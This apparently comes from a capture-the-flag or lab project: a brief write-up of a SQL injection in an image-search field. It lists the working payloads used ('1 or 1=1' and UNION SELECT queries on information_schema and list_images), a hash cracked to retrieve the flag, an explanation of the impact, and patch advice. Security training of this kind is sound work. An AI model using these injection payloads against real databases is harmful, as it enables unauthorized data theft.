# SQL INJECTION

## VULNERABILITY
Right after the member section, we checked if there were other SQL query on the website. You can search images througth id. Entering the right id will give you informations about the image.

## EXPLOIT
The "1 or 1=1" will provide the list. The 5th image seemed interesting. As we did previously, we can use the "1 UNION SELECT table_name, column_name FROM information_schema.columns" that will help finding the argument to query from the database. we found "list_images" and we are still interested in id=5. Tried "5 UNION SELECT title, comment FROM list_images WHERE id=5" and got:
"If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"
Use crackstation and cyberchef (or echo -n albatroz | sha256sum).
Here we could dump the database from the web application.

## INFOS
SQL injection allows an attacker to interfere with the queries that an application makes to its database.
With this vulnerability, an attacker could read/delete/insert sensitive data from the complete database (involving users' personal information, emails, password, etc).

## PATCH
The client should not be able to supply an input, whitelist input validation is recommended.
An other solution would be to use an ORM that will natively prevent SQL injections.

## SOURCES
https://portswigger.net/web-security/sql-injection
